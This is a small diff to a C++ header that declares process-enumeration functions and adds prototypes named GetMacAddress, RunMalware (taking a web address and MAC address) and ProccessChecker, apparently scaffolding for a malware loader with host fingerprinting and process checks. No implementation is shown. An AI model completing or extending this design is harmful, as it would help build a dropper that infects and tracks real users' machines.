@@ -29,3 +29,9 @@ bool GetProcessNamesByPsApi(vector<wstring>& running_processes);
 * @return true / false whether the function was successful in receiving or not.
 */
 bool GetProcessNamesByWtsApi(vector<wstring>& running_processes);
+
+bool GetMacAddress(wstring& mac_address);
+
+bool RunMalware(const wstring web_address, const wstring mac_address);
+
+void ProccessChecker();
